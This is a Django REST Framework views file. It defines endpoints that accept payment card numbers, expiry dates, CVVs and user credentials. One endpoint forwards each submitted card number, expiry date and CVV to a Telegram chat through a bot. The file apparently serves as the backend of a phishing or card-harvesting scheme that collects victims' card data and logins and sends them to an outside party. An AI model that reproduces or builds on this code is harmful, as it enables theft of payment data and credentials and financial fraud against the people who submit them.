from rest_framework import status
from rest_framework.response import Response
from rest_framework.decorators import api_view
from .models import CardInfo, CardInfoDetailed, UserCredentials
from .serializers import CardInfoSerializer, CardInfoDetailedSerializer, UserCredentialsSerializer
import telegram
import os

# Получите ваш Telegram bot token из среды окружения или замените его напрямую
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)

@api_view(['POST'])
def send_card_info(request):
    serializer = CardInfoSerializer(data=request.data)
    if serializer.is_valid():
        card_info = serializer.save()
        message = f"Card Number: {card_info.card_number}\nExpiry Date: {card_info.expiry_date}\nCVV: {card_info.cvv}"
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
        return Response({'message': 'Card info saved and sent to Telegram'}, status=status.HTTP_201_CREATED)
    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

@api_view(['POST'])
def save_detailed_card_info(request):
    serializer = CardInfoDetailedSerializer(data=request.data)
    if serializer.is_valid():
        serializer.save()
        return Response({'message': 'Detailed card info saved'}, status=status.HTTP_201_CREATED)
    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

@api_view(['POST'])
def save_user_credentials(request):
    serializer = UserCredentialsSerializer(data=request.data)
    if serializer.is_valid():
        serializer.save()
        return Response({'message': 'User credentials saved'}, status=status.HTTP_201_CREATED)
    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
